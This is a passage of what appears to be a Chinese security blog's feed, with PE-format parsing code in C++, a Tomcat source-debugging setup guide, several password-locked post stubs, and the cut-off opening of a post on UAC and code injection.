0000到0xFFFFFFFF之间。这些编号就是<strong>虚拟地址</strong>。</p><p>相对虚拟地址（RVA）：PE文件不会占满整个虚拟内存空间，而是会占用一部分。那么就会有一个起始位置，这个起始位置也成为加载基址。PE文件中的数据相对于加载基址的偏移就是<strong>相对虚拟地址。</strong></p><p><strong>如果系统加载PE文件的时候，是将PE文件原封不动的复制到了内存中，那么某一个数据的FOA和RVA就是相等的。</strong></p><p><strong>但是现实情况并非如此，系统加载PE文件到内存的之后，PE文件是被扩展了的。</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">RvaToFoa</span><span class="params">(<span class="type">char</span>* lpImage,DWORD dwRva)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1 获取区段表的起始位置</span></span><br><span class="line">PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpImage;</span><br><span class="line">PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + lpImage);</span><br><span class="line">PIMAGE_SECTION_HEADER pHeader = <span class="built_in">IMAGE_FIRST_SECTION</span>(pNt);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (dwRva&lt; pNt-&gt;OptionalHeader.SizeOfHeaders)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> dwRva;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//2 循环判断RVA落在了哪个区段中</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; pNt-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">&#123;</span><br><span class="line">DWORD dwSectionRva =  pHeader[i].VirtualAddress;</span><br><span class="line">DWORD dwSectionEndRva = dwSectionRva + pHeader[i].SizeOfRawData;</span><br><span class="line">DWORD dwSectionFOA = pHeader[i].PointerToRawData;</span><br><span class="line"><span class="keyword">if</span> (dwRva&gt;= dwSectionRva &amp;&amp;dwRva&lt;= dwSectionEndRva)</span><br><span class="line">&#123;</span><br><span class="line">pHeader[i].VirtualAddress;</span><br><span class="line">DWORD dwFOA = dwRva - dwSectionRva+ dwSectionFOA;</span><br><span class="line"><span class="keyword">return</span> dwFOA;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="小功能的实现"><a href="#小功能的实现" class="headerlink" title="小功能的实现"></a>小功能的实现</h2><h3 id="位置计算"><a href="#位置计算" class="headerlink" title="位置计算"></a>位置计算</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//位置计算器按钮</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CPEDlg::OnBnClickedButton2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">UpdateData</span>(TRUE);</span><br><span class="line"><span class="keyword">if</span> (m_strEditTest1 != <span class="string">L&quot;&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">CMGpsCalcDlg* pPrcPopDg = <span class="keyword">new</span> CMGpsCalcDlg;</span><br><span class="line"></span><br><span class="line">pPrcPopDg-&gt;<span class="built_in">Create</span>(IDD_DIALOG1, <span class="keyword">this</span>);</span><br><span class="line">pPrcPopDg-&gt;<span class="built_in">ShowWindow</span>(SW_SHOW);</span><br><span class="line">pPrcPopDg-&gt;<span class="built_in">GetPath</span>(buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMGpsCalcDlg::RvaToFoa</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">UpdateData</span>(TRUE);</span><br><span class="line"></span><br><span class="line">CString svPid = m_strEditRva.<span class="built_in">GetString</span>();</span><br><span class="line">DWORD dwRva = _tcstoul(svPid, <span class="literal">NULL</span>, <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//1 获取区段表的起始位置</span></span><br><span class="line">PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)buf;</span><br><span class="line">PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + buf);</span><br><span class="line">PIMAGE_SECTION_HEADER pHeader = <span class="built_in">IMAGE_FIRST_SECTION</span>(pNt);</span><br><span class="line">PIMAGE_OPTIONAL_HEADER pOption = &amp;pNt-&gt;OptionalHeader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (dwRva &lt; pNt-&gt;OptionalHeader.SizeOfHeaders)</span><br><span class="line">&#123;</span><br><span class="line">CString cd;</span><br><span class="line">cd.<span class="built_in">Format</span>(<span class="string">L&quot;%x&quot;</span>, dwRva);</span><br><span class="line">m_strEditFoa.<span class="built_in">SetString</span>(cd);</span><br><span class="line"><span class="built_in">UpdateData</span>(FALSE);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//2 循环判断RVA落在了哪个区段中</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; pNt-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">&#123;</span><br><span class="line">DWORD dwSectionRva = pHeader[i].VirtualAddress;</span><br><span class="line">DWORD dwSectionEndRva = dwSectionRva + pHeader[i].SizeOfRawData;</span><br><span class="line">DWORD dwSectionFOA = pHeader[i].PointerToRawData;</span><br><span class="line"><span class="keyword">if</span> (dwRva &gt;= dwSectionRva &amp;&amp; dwRva &lt;= dwSectionEndRva)</span><br><span class="line">&#123;</span><br><span class="line">pHeader[i].VirtualAddress;</span><br><span class="line"></span><br><span class="line"><span class="comment">//FOA= RVA   - RVA区段   + FOA区段</span></span><br><span class="line">DWORD dwFOA = dwRva - dwSectionRva + dwSectionFOA;</span><br><span class="line">CString foa;</span><br><span class="line">foa.<span class="built_in">Format</span>(<span class="string">L&quot;%x&quot;</span>,dwFOA);</span><br><span class="line">m_strEditFoa.<span class="built_in">SetString</span>(foa);</span><br><span class="line"></span><br><span class="line"><span class="comment">//va虚拟地址= InmageBase(加载基址) + RVA(相对虚拟地址)</span></span><br><span class="line">DWORD dwVA = pOption-&gt;ImageBase + dwRva;</span><br><span class="line">CString va;</span><br><span class="line">va.<span class="built_in">Format</span>(<span class="string">L&quot;%x&quot;</span>, dwVA);</span><br><span class="line">m_strEditVa.<span class="built_in">SetString</span>(va);</span><br><span class="line"></span><br><span class="line"><span class="comment">//区段名</span></span><br><span class="line">CString name;</span><br><span class="line">name.<span class="built_in">Format</span>(<span class="string">L&quot;%S&quot;</span>, pHeader[i].Name);</span><br><span class="line">m_strEditName.<span class="built_in">SetString</span>(name);</span><br><span class="line"></span><br><span class="line"><span class="built_in">UpdateData</span>(FALSE);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">MessageBox</span>(<span class="string">L&quot;不存在该地址&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="响应拖拽"><a href="#响应拖拽" class="headerlink" title="响应拖拽"></a>响应拖拽</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//响应文件拖拽</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CPEDlg::OnDropFiles</span><span class="params">(HDROP hDropInfo)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 存放文件路径</span></span><br><span class="line"><span class="type">wchar_t</span> filePath[MAX_PATH] = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取拖拽文件的路径</span></span><br><span class="line"><span class="built_in">DragQueryFile</span>(hDropInfo, <span class="number">0</span>, filePath, MAX_PATH);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 更新变量</span></span><br><span class="line">m_strEditPath = filePath;</span><br><span class="line"><span class="built_in">UpdateData</span>(FALSE);</span><br><span class="line"></span><br><span class="line">CDialogEx::<span class="built_in">OnDropFiles</span>(hDropInfo);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="时间换算"><a href="#时间换算" class="headerlink" title="时间换算"></a>时间换算</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//时间转换</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CPEDlg::OnBnClickedButton3</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)buf;</span><br><span class="line">PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + buf);</span><br><span class="line">PIMAGE_FILE_HEADER pFileHeader = &amp;pNt-&gt;FileHeader;<span class="comment">//NT头</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">tm</span>* p;</span><br><span class="line"></span><br><span class="line"><span class="type">time_t</span> t =pFileHeader-&gt;TimeDateStamp;</span><br><span class="line">p = <span class="built_in">localtime</span>(&amp;t);</span><br><span class="line">CString Time;</span><br><span class="line">Time.<span class="built_in">Format</span>(<span class="string">L&quot;%d年%d月%d日%d时%d分%d秒&quot;</span>, <span class="number">1900</span> + p-&gt;tm_year, <span class="number">1</span> + p-&gt;tm_mon, p-&gt;tm_mday, p-&gt;tm_hour, p-&gt;tm_min, p-&gt;tm_sec);</span><br><span class="line"><span class="built_in">MessageBox</span>(Time);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="PE文件结构图"><a href="#PE文件结构图" class="headerlink" title="PE文件结构图"></a>PE文件结构图</h2><p><img src="/2020/11/24/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/25.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> Windows安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PE文件结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows进程线程</title>
      <link href="/2020/11/23/Windows%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B/"/>
      <url>/2020/11/23/Windows%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="9ab935ae2e67d82e5e6dc53697d6bd975ba31e87c1b8e80ce7db6fca85e3a336">b3c9a99c0ccdca4a7128185684909d47d5a5888311d003d0768b8d00f2853565</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输出正确的密码</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> Windows安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows进程线程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反调试</title>
      <link href="/2020/11/23/%E5%8F%8D%E8%B0%83%E8%AF%95/"/>
      <url>/2020/11/23/%E5%8F%8D%E8%B0%83%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="9ab935ae2e67d82e5e6dc53697d6bd975ba31e87c1b8e80ce7db6fca85e3a336">b3c9a99c0ccdca4a7128185684909d47d5a5888311d003d0768b8d00f2853565</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">暂时不对旅行者开放</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 逆向破解 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反调试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bypass免杀思路</title>
      <link href="/2020/11/21/bypass%E5%85%8D%E6%9D%80%E6%80%9D%E8%B7%AF/"/>
      <url>/2020/11/21/bypass%E5%85%8D%E6%9D%80%E6%80%9D%E8%B7%AF/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="d0a191af1b7e03021b83ea99adf5292c2dded0e2309a4dcfb267905eb2e4acfb">b3c9a99c0ccdca4a7128185684909d47c7b4109eddc3e1e95fa17bdb523e92f757271aa16897c7099e6ee5eef185c941447a457f1d7b7fcb3103200b2ac755270ee0db829abb4a8b6848c5ec5362b69bd51873edaea89bbf0aec0b70eaad845fd395310bc6f89adbaaf9257945358bd0a4f16cc42b21908b61f615bb52d4ca389c7c8c94814383ffbb94ce2b930abe18afe444021bc12e90d1be03be234473e3</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输出正确的密码</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> bypass </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C/C++那些事</title>
      <link href="/2020/11/21/C++%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/"/>
      <url>/2020/11/21/C++%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="d482a35e3c86a70240d4bad8184e5d828781d2e50912514332cf232ea25be802"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">what's that?</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tomcat源码调试</title>
      <link href="/2020/11/10/Tomcat%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95/"/>
      <url>/2020/11/10/Tomcat%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h1 id="Tomcat源码调试"><a href="#Tomcat源码调试" class="headerlink" title="Tomcat源码调试"></a>Tomcat源码调试</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>后面的很多漏洞环境在调试的时候都需要步入 Tomcat 源码文件里，在步入的 class 反编译文件观感不佳（例如变量名丢失，变成了 var 1,2,3…诸如此类）。所以这里写篇笔记记录一下自己的配置过程和遇到的问题的解决方案（自己瞎鼓捣的，并非最好的解决方案），如果其他师傅有比较好的配置方法，欢迎分享学习学习。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>因为我的 Tomcat 版本是 9.0.65，所以我在官方下载的也是该版本的源码压缩包<br><img src="/2020/11/10/Tomcat%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95/image-20221102104218124.png" alt="image-20221102104218124"></p><p>解压如下</p><p><img src="/2020/11/10/Tomcat%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95/image-20221102104341694.png" alt="image-20221102104341694"></p><p>把 java 文件夹里的 javax 和 org 两个文件夹复制到创建的 Java 项目中<br><img src="/2020/11/10/Tomcat%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95/image-20221102104454294.png" alt="image-20221102104454294"></p><p>在 pom.xml 里添加如下的 maven 依赖：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- tomcat source--&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;biz.aQute.bnd&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;biz.aQute.bndlib&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;5.2.0&lt;/version&gt;</span><br><span class="line">    &lt;scope&gt;provided&lt;/scope&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.ant&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;ant&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;1.9.7&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;wsdl4j&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;wsdl4j&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;1.6.2&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;javax.xml&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;jaxrpc&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;1.1&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.eclipse.jdt.core.compiler&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;ecj&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;4.5.1&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure></p><p>接下来就是设置字节码版本（以自己的 JDK 版本为准），我的是 jdk 1.8，故配置如下：</p><p>项目结构-模块<br><img src="/2020/11/10/Tomcat%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95/image-20221102105319386.png" alt="image-20221102105319386"></p><p>偏好设置-构建运行部署-编译器-Java 编译器<br><img src="/2020/11/10/Tomcat%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95/image-20221102105407398.png" alt="image-20221102105407398"></p><p>运行 Java 项目，可能会遇见如下错误；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java: 找不到符号</span><br><span class="line">  符号:   变量 VERSION_9</span><br><span class="line">  位置: 类 org.eclipse.jdt.internal.compiler.impl.CompilerOptions</span><br></pre></td></tr></table></figure><p><img src="/2020/11/10/Tomcat%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95/image-20221102104846234.png" alt="image-20221102104846234"></p><p>个人理解该报错原因是我的 JDK 版本为1.8，所以没有后面的符号变量（非准确说法，勿信），我的解决方案是把这些所有报错的红色变量都改为：<code>VERSION_1_8</code>，也可以注释掉<br><img src="/2020/11/10/Tomcat%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95/image-20221102105557452.png" alt="image-20221102105557452"></p><p>现在项目可以正常运行了，调试情况如下：<br><img src="/2020/11/10/Tomcat%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95/image-20221102105700077.png" alt="image-20221102105700077"></p><p>可以看到调用栈上关于 Tomcat 的部分，都有明显的颜色区分，步入进去是 java 源文件，而非 class 反编译的文件<br><img src="/2020/11/10/Tomcat%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95/image-20221102105714779.png" alt="image-20221102105714779"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Butterfly美化日记</title>
      <link href="/2020/10/27/test%E7%BE%8E%E5%8C%96%E6%97%A5%E5%BF%97/"/>
      <url>/2020/10/27/test%E7%BE%8E%E5%8C%96%E6%97%A5%E5%BF%97/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="b25a1cf6949d54553333995c0c5839e7a30a6a1c3d69cd863cb34d48b4636488">b3c9a99c0ccdca4a7128185684909d47c7b4109eddc3e1e95fa17bdb523e92f7b017452cb517f7a02c6e9db0605151a5eeed31d4ed4e6fb825d57596d0004e2872139b156a62d7128a6ad61c8b0a59c2f43d2e00d2a605e2b5b9691b456ccc7c6a818e38f2ba5326adef03f06940a6894138428f964f0712cafd5a5bc8579a00d3372b8f8239b97e647ca7c34313edb5d5a7e2a55024a7002662aea4c061be419f3521a07c96845ca6eb765d54b154a8dcd53f580ee65dbe13713895d7f2d9552f6a596bcb93bf7436ec156ddd0cfae78f481189de3c2a98148e80b671f5ce866263534285897e13b573fc1955bb04b36557504b2040c0b73133c298e600e93c4719b87264ec7346c9990148f9a28d72cf926976a39b03360b038c51e7e810bc7050489bedf801d01b2859d1c04413e7d5d883ef247a1c223f865081509d586228ecfc8e633a77635e3f95fba50a3efdd634e79fe3da79c7157b24350b6392af84acebc2234daeba8a32b86b7da81f61175f66df1b7a729398661acbad84cfb6e8764fb57ea5ffce81249b5ab811f30c9dcee9735c80b157fa7c0c8fb62fc17b58d1a7942b6df32c1b90edd033344b104153685370f17de1941b5d5a1b4592f4f4c32d88d24f6d0905581c42366fd4d4ecc4a95ebd780fe17de0ba2699886e6c79e1dc81ea11f853c342202bc3d9de7f5dfa9abad1a9364ca0980b2e56268fd24886c39ce69e5c36e0ad50410379c1b3b6e9c47db4515b413545caacf71aedddf03a40891f876e569f03b3c86ce2e7b426371edcf90fe6f9fe15f2ec9fae74e9642c158dff8bce7ffe17a0cc6d95c83b17bf73720157dac270b5b75823f7f21e173020da4638c69ba51301737927bef2</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">旅行者，该文章需要填写密码，请联系管理员！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> Bufferfly </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Bufferfly </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>代码注入与拦截</title>
      <link href="/2020/06/21/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8B%A6%E6%88%AA/"/>
      <url>/2020/06/21/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8B%A6%E6%88%AA/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h1><h2 id="权限管理"><a href="#权限管理" class="headerlink" title="权限管理"></a>权限管理</h2><p><img src="/2020/06/21/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8B%A6%E6%88%AA/1.png" alt="image-1"></p><h2 id="UAC机制"><a href="#UAC机制" class="headerlink" title="UAC机制"></a>UAC机制</h2><h3 id="管理方式"><a href="#管理方式" class="headerlink" title="管理方式"></a>管理方式</h3><p>在管理员账户下，运行一个程序，也是低权限，只有选择管理员方式运行，才会分配高权限。</p><p><img src="/2020/06/21/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8B%A6%E6%88%AA/2.png" alt="image-2"></p><h3 id="调整UAC"><a href="#调整UAC" class="headerlink" title="调整UAC"></a>调整UAC</h3><p>方法1：gpedit</p><p><img src="/2020/06/21/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8B%A6%E6%88%AA/3.png" alt="image-3"></p><p>方法2 ：设置</p><p><img src="/2020/06/21/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8B%A6%E6%88%AA/4.png" alt="image-4"></p><h3 id="使用案例"><a href="#使用案例" class="headerlink" title="使用案例"></a>使用案例</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span 